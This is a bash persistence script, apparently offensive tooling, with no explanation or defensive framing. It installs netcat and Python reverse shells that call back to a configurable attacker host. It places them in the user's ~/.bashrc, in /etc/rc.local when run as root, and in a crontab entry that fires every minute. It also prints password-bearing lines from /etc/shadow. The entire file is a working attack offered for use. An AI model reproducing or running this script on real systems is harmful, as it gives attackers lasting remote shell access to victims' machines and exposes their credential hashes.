#!/bin/bash

attackBox=0.0.0.0
attackPort=5253
cron="* * * * *"

if $(which python | grep -qi python)
then
	python=yes
fi

if $(which nc | grep -qi nc)
then
	nc=yes
fi

if [ ! -f "/etc/rc.local" ];
then
	rclocal=no
elif [ -f "/etc/rc.local" ];
then
	rclocal=yes
fi

if $(env | grep -qi HOME)
then
	home=yes
fi

if $(which crontab | grep -qi crontab)
then
	crontab=yes
fi

if $(id | grep -qi root)
then
	root=yes
fi

if [[ $home == "yes" ]];
then
	if [[ $nc == "yes" ]];
	then
		touch ~/.bashrc
		echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc
		if $(grep nc ~/.bashrc | grep $attackBox | grep -qi $attackPort);
		then
			echo -e "\e[92m[+]\e[0m Netcat reverse shell placed in $USER's bashrc"
			echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
		fi
	fi
	if [[ $python == "yes" ]];
	then
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
		if $(grep python ~/.bashrc | grep $attackBox | grep -qi $attackPort)
		then
			echo -e "\e[92m[+]\e[0m Python reverse shell placed in $USER's bashrc"
			echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
		fi
	fi

fi

if [[ $root == "yes" ]];
then
	if [[ $rclocal == "no" ]];
	then
		echo "/bin/sh -e" > /etc/rc.local
		rclocal=yes
	fi
	if [[ $rclocal == "yes" ]];
	then
		grep -v "exit 0" /etc/rc.local > /dev/shm/rc.local.tmp
		if [[ $python == "yes" ]];
		then
			if [[ $python == $nc ]];
			then
				echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /dev/shm/rc.local.tmp
				echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/rc.local.tmp
				mv /dev/shm/rc.local.tmp /etc/rc.local
				echo -e "\e[92m[+]\e[0m Netcat reverse shell placed in /etc/rc.local"
				echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
				echo -e "\e[92m[+]\e[0m Python reverse shell placed in /etc/rc.local"
				echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
			elif [[ $python != $nc ]];
			then
				echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/rc.local.tmp
				mv /dev/shm/rc.local.tmp /etc/rc.local
				echo -e "\e[92m[+]\e[0m Python reverse shell placed in /etc/rc.local"
				echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
			fi
		elif [[ $nc == "yes" ]];
		then
			echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" > /dev/shm/rc.local.tmp
			mv /dev/shm/rc.local.tmp /etc/rc.local
			echo -e "\e[92m[+]\e[0m Netcat reverse shell placed in /etc/rc.local"
			echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
		fi
	fi
	echo "exit 0" >> /etc/rc.local
	chmod +x /etc/rc.local
	echo -e "\e[92m[+]\e[0m Users with passwords from the shadow file"
	egrep -v "\*|\!" /etc/shadow
fi

if [[ $crontab == "yes" ]];
then
	crontab -l 2> /dev/null > /dev/shm/.cron.sh
	if [[ $python == "yes" ]];
	then
		echo "$cron python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\nexit 0" >> /dev/shm/.cron.sh
		crontab /dev/shm/.cron.sh
		echo -e "\e[92m[+]\e[0m Python reverse shell loaded in crontab"
		echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort on a $cron schedule"
	fi
	if [[ $nc == "yes" ]];
	then
		echo "$cron nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /dev/shm/.cron.sh
		echo -e "\e[92m[+]\e[0m Netcat reverse shell loaded in crontab"
		echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort on a $cron schedule"
		crontab /dev/shm/.cron.sh
	fi
	rm /dev/shm/.cron.sh
fi
